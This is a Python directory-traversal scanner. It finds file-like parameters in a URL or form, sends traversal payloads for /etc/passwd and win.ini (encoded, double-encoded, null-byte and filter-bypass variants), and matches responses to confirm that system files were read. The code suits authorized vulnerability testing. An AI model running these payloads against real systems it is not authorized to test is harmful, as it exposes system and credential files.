import requests
import urllib.parse
from bs4 import BeautifulSoup
import re

def scan_directory_traversal(url):
    """
    Scans for directory traversal (path traversal) vulnerabilities.
    """
    parsed_url = urllib.parse.urlparse(url)
    query_params = urllib.parse.parse_qs(parsed_url.query)

    # Common file parameter names
    file_param_names = [
        'file', 'document', 'page', 'filename', 'path', 'doc',
        'folder', 'root', 'fileroot', 'filepath', 'load', 'read',
        'download', 'dir', 'view', 'content', 'include', 'require',
        'inc', 'locate', 'show', 'site', 'template', 'php_path'
    ]

    # Test payloads for different operating systems
    test_payloads = [
        # Linux/Unix files
        '../../../etc/passwd',
        '../../../../etc/passwd',
        '../../../../../etc/passwd',
        '../../../../../../etc/passwd',
        '../../../../../../../etc/passwd',
        '../../../../../../../../etc/passwd',

        # Windows files
        '../../../windows/win.ini',
        '../../../../windows/win.ini',
        '../../../../../windows/win.ini',
        '../../../../../../windows/win.ini',
        '../../../../../../../windows/win.ini',

        # URL-encoded variants
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini',

        # Double URL-encoded
        '%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd',

        # Using null bytes (may bypass some filters)
        '../../../etc/passwd%00',
        '../../../etc/passwd%00.jpg',

        # Path normalization bypasses
        '..././..././..././etc/passwd',
        '..%2f..%2f..%2fetc%2fpasswd'
    ]

    # Patterns to identify successful traversal
    passwd_patterns = [
        r'root:.*:0:0:',  # Common pattern in /etc/passwd
        r'nobody:.*:99:99'  # Common pattern in /etc/passwd
    ]

    win_ini_patterns = [
        r'\[extensions\]',  # Common pattern in win.ini
        r'MirrorDriverInstalled'  # Common pattern in win.ini
    ]

    # Check for potential file parameters in URL
    potential_params = {}
    for param_name, values in query_params.items():
        if param_name.lower() in file_param_names or 'file' in param_name.lower() or 'path' in param_name.lower():
            potential_params[param_name] = values[0]

    # If no parameters found in URL, scan the page for forms
    if not potential_params:
        try:
            response = requests.get(url)
            soup = BeautifulSoup(response.text, 'html.parser')

            # Check forms for potential file input fields
            for form in soup.find_all('form'):
                for input_tag in form.find_all('input'):
                    input_name = input_tag.get('name', '').lower()
                    if input_name and (input_name in file_param_names or 'file' in input_name or 'path' in input_name):
                        potential_params[input_tag.get('name')] = input_tag.get('value', '')

        except requests.exceptions.RequestException as e:
            print(f"Error scanning {url} for directory traversal parameters: {e}")

    if not potential_params:
        return {"vulnerable": False, "message": "No potential file parameters found"}

    # Test each parameter with traversal payloads
    vulnerable_params = []

    for param_name, original_value in potential_params.items():
        for payload in test_payloads:
            # Create a test URL with the payload
            test_url_parts = list(parsed_url)
            query_dict = urllib.parse.parse_qs(parsed_url.query)
            query_dict[param_name] = [payload]
            test_url_parts[4] = urllib.parse.urlencode(query_dict, doseq=True)
            test_url = urllib.parse.urlunparse(test_url_parts)

            try:
                response = requests.get(test_url, timeout=10)
                response_text = response.text

                # Check for patterns indicating successful traversal
                is_vulnerable = False
                matched_pattern = None

                # Check for /etc/passwd content
                if 'etc/passwd' in payload:
                    for pattern in passwd_patterns:
                        if re.search(pattern, response_text):
                            is_vulnerable = True
                            matched_pattern = pattern
                            break

                # Check for Windows file content
                elif 'win.ini' in payload:
                    for pattern in win_ini_patterns:
                        if re.search(pattern, response_text):
                            is_vulnerable = True
                            matched_pattern = pattern
                            break

                if is_vulnerable:
                    vulnerable_params.append({
                        "parameter": param_name,
                        "payload": payload,
                        "matched_pattern": matched_pattern,
                        "test_url": test_url
                    })
                    break  # Found a vulnerability with this parameter, no need to test more payloads

            except requests.exceptions.RequestException as e:
                print(f"Error testing {test_url} for directory traversal: {e}")
                continue

    if vulnerable_params:
        return {
            "vulnerable": True,
            "type": "Directory Traversal",
            "url": url,
            "vulnerable_parameters": vulnerable_params
        }
    else:
        return {"vulnerable": False}

if __name__ == '__main__':
    test_url = "http://localhost:3000"  # Replace with a test URL
    result = scan_directory_traversal(test_url)
    print(result)
